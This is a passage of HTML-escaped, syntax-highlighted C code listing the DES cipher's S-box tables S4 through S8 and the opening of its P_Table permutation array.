	&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,
	&lt;span style=&#34;color:#75715e&#34;&gt;//S4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	 &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,
	&lt;span style=&#34;color:#75715e&#34;&gt;//S5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	 &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,
	&lt;span style=&#34;color:#75715e&#34;&gt;//S6
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,
   	 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,
	&lt;span style=&#34;color:#75715e&#34;&gt;//S7
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,
	&lt;span style=&#34;color:#75715e&#34;&gt;//S8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; P_Table[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
	&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,
